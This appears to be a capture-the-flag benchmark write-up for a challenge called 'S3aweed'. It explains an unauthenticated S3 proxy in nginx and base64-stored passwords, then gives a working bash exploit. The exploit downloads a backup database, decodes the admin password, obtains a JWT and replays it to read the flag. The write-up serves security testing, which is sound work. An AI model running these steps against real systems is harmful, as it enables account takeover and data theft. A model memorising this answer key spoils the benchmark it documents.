# XBEN-084-24 — S3aweed — Exposed S3 Backup + JWT Session Reuse

> **Live PoC:** Start the benchmark with `make run`, then run `make poc` from its benchmark directory. The runner discovers the current published port and prints only the flag recovered from the running service.

**Vuln class:** Information Disclosure (unauthenticated S3 service reachable through nginx) +
Privilege Escalation. `nginx.conf` proxies port `8333` straight to the internal `s3rver`
(S3-compatible mock storage) with no authentication, only restricting the HTTP method to
`GET/HEAD/OPTIONS`. This lets an attacker list buckets and download a `backups/manapool.db`
SQLite file containing all user records — including a base64-"hashed" password for the
`isMaster` admin account. That password can be used directly against the real login API to
obtain a valid JWT session for the admin, unlocking `/adminpanel/profile`.

## Root cause

`nginx/nginx.conf` exposes the internal S3 store unauthenticated:

```nginx
server {
    listen 8333;
    location / {
        proxy_pass http://s3:8333;
        limit_except GET HEAD OPTIONS { deny all; }
    }
}
```

`frontend/pages/api/auth.ts` stores/compares passwords as `base64(password)` with no real
hashing, so a password recovered from the DB backup is trivially reversible:

```ts
const sanitizedPassword = stringToBase64(xss(validator.escape(password)));
...
const userResult = await signIn({ email: sanitizedEmail, password: sanitizedPassword });
```

`frontend/app/db/sqlite.tsx` users table has an `isMaster` flag; the admin panel
(`frontend/app/adminpanel/profile/page.tsx`) trusts any valid JWT issued by `/api/auth`,
regardless of `isMaster`, as long as the token decodes to a real user id.

## Exploit (copy-pasteable, ports substituted for this run: web=55298, s3=55299)

`nginx` publishes both container ports to random host ports (80 → web, 8333 → S3), so the two
are discovered at run time. The four steps — (1) download the backup DB from the unauthenticated
S3 port, (2) read the `isMaster` user row and base64-decode its stored password, (3) log in with
those credentials to obtain a JWT, (4) replay that JWT as the `token` cookie against
`/adminpanel/profile` — are wired together so the recovered password and issued token flow
straight through:

```bash
WEB=55298    # host port mapped to nginx container port 80
S3PORT=55299 # host port mapped to nginx container port 8333

# 1. Unauthenticated S3: list buckets and download the backup DB.
curl -s "http://localhost:$S3PORT/"                               # -> assets, backups
curl -s "http://localhost:$S3PORT/backups/manapool.db" -o manapool.db

# 2. Recover the master account's plaintext password (stored as reversible base64).
CREDS=$(sqlite3 manapool.db \
  "SELECT email || ' ' || password FROM users WHERE isMaster=1;")
EMAIL=${CREDS% *}
PASSWORD=$(echo "${CREDS#* }" | base64 -d)

# 3. Log in through the real auth API to get a valid JWT for the master user.
TOKEN=$(curl -s -X POST "http://localhost:$WEB/api/auth" \
  -H "Content-Type: application/json" \
  -d "{\"email\":\"$EMAIL\",\"password\":\"$PASSWORD\"}" \
  | sed -n 's/.*"token":"\([^"]*\)".*/\1/p')

# 4. Replay the JWT as the token cookie to reach the admin profile page.
curl -s "http://localhost:$WEB/adminpanel/profile" \
  -H "Cookie: token=$TOKEN" | grep -o "FLAG{[^<\"]*}"
```

> The automated `make poc` runner resolves both published ports itself (via
> `docker compose ps`) and performs these same four steps in one Python pass, since the generic
> single-port runner cannot supply both the web and S3 ports.
